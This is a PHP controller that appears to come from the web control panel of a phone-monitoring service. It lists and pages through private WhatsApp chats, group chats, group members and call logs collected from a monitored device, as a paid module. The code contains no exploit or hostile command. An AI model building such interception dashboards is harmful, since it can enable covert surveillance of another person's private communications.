<?php

namespace Controllers;

use System\FlashMessages,
    Models\Modules,
    CS\Devices\Limitations;

class Whatsapp extends BaseModuleController
{

    protected $module = Modules::WHATSAPP;
    protected $lengthPage = 5;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {
        $whatsappModel = new \Models\Cp\Whatsapp($this->di);
        
        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            if ($this->params['tab'] === 'private') {
                $data = $whatsappModel->getPrivateDataTableData(
                        $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                );
            } elseif ($this->params['tab'] === 'group') {
                $data = $whatsappModel->getGroupDataTableData(
                        $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                );
            } elseif ($this->params['tab'] === 'calls') {
                $data = $whatsappModel->getCallsDataTableData(
                        $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                );
            }
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }

        $this->view->callsTab = ($this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] >= 9) ||
                ($this->di['currentDevice']['os'] === 'ios' && $this->di['currentDevice']['app_version'] >= 7);
        
        if ($this->view->paid) {
            $this->view->hasRecords = $whatsappModel->hasRecords($this->di['devId']);
        }

        $this->setView('cp/whatsapp/index.htm');
    }

    public function listAction()
    {
        $whatsappModel = new \Models\Cp\Whatsapp($this->di);

        if ($this->getRequest()->isAjax()) {
            
            $currPage = ($this->getRequest()->hasPost('currPage') && $this->getRequest()->post('currPage') > 0) ? $this->getRequest()->post('currPage') : 0;
            $perPage = ($this->getRequest()->hasPost('perPage') && $this->getRequest()->post('perPage') > 0) ? $this->getRequest()->post('perPage') : $this->lengthPage;
            $search = ($this->getRequest()->hasPost('search')) ? $this->getRequest()->post('search') : false;
            
            $data = array();
            if($this->params['tab'] == 'private')
                $data = $whatsappModel->getItemsPrivateList($this->di['devId'], $this->params['id'], $search, $currPage, $perPage);
            
            if($this->params['tab'] == 'group')
                $data = $whatsappModel->getItemsGroupList($this->di['devId'], $this->params['id'], $search, $currPage, $perPage);
            
            $this->makeJSONResponse($data);
        }
        
        $dialogueExists = false;
        
        switch ($this->params['tab']) {
            case 'group':
                $dialogueExists = $whatsappModel->isGroupDialogueExists($this->di['devId'], $this->params['id']);
                $this->view->users = $whatsappModel->getGroupUsers($this->di['devId'], $this->params['id']);
                break;

            case 'private':
                $numberName = $whatsappModel->getNumberName($this->di['devId'], $this->params['id']);
                if ($numberName !== false) {
                    $this->view->numberName = $numberName;
                    $dialogueExists = true;
                }
                break;

            default:
                break;
        }

        if (!$dialogueExists) {
            $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
            $this->redirect($this->di['router']->getRouteUrl('whatsapp'));
        }

        $this->view->tab = $this->params['tab'];
        $this->view->id = $this->params['id'];

        $this->setView('cp/whatsapp/list.htm');
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Whatsapp');

        if ($this->di['currentDevice']['os'] != 'icloud') {
            $this->view->customTimezoneOffset = 0;
        }
        
        $this->view->moduleId = Modules::WHATSAPP;
    }
    
    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::WHATSAPP);
    }

}
